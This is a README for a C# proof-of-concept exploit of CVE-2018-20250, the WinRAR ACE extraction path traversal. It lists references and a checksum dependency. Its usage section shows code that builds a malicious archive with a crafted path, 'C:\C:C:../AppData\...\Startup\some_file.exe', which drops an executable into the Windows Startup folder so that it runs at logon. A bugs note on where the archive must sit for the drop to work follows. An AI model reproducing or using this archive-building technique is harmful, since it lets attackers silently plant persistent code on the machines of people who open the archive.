# CVE-2018-20250-WinRAR-ACE
Proof of concept code in C# to exploit the WinRAR ACE file extraction path (CVE-2018-20250).

# Resources
https://research.checkpoint.com/extracting-code-execution-from-winrar/
https://github.com/droe/acefile
https://apidoc.roe.ch/acefile/latest/

# Dependencies
InvertedTomato.Crc (you can install it with NuGet) for the checksum method. You can use any other JAMCRC implementation.

# How to use
```csharp
  AceVolume av = new AceVolume();
  AceFile hola = new AceFile(
    @"D:\some_file.exe",
    @"C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\some_file.exe"
  );
  av.AddFile(f);
  av.Save("exploit.rar");
```

# Bugs
Seems that it only extracts to startup folder when the .rar file is in Desktop or any folder on the same level.
